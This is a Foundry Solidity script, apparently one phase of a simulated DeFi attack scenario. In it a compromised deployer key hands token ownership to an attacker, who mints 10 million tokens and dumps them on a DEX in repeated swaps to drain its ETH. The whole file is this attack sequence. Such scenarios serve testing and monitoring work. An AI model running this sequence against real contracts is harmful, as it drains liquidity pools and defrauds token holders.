// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";

interface IGovAttack {
    function transferOwnership(address newOwner) external;
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IDEXAttack {
    function swapTokenForETH(uint256 tokenAmount) external returns (uint256);
}

/**
 * @title ExecuteAttack
 * @notice Phase 3: ~15 attack transactions.
 *         Attacker compromises owner key, transfers ownership,
 *         mints massive supply, dumps on DEX in multiple swaps.
 */
contract ExecuteAttack is Script {
    function run() external {
        address govAddr = vm.envAddress("GOV_ADDRESS");
        address dexAddr = vm.envAddress("DEX_ADDRESS");

        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");
        address attackerAddr = vm.addr(attackerKey);

        IGovAttack gov = IGovAttack(govAddr);

        // Step 1: Compromised admin transfers ownership to attacker
        vm.startBroadcast(deployerKey);
        gov.transferOwnership(attackerAddr);
        vm.stopBroadcast();

        // Step 2: Attacker mints massive supply and dumps on DEX
        vm.startBroadcast(attackerKey);

        // Mint 10M tokens to self (10x the initial supply)
        gov.mint(attackerAddr, 10_000_000e18);
        console.log("Attacker minted 10M GOV tokens");

        // Approve DEX for dumping
        gov.approve(dexAddr, 10_000_000e18);

        // Dump in multiple swaps to drain DEX ETH
        IDEXAttack dex = IDEXAttack(dexAddr);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);
        dex.swapTokenForETH(500_000e18);

        console.log("Attacker dumped 5M GOV tokens on DEX");

        vm.stopBroadcast();
    }
}
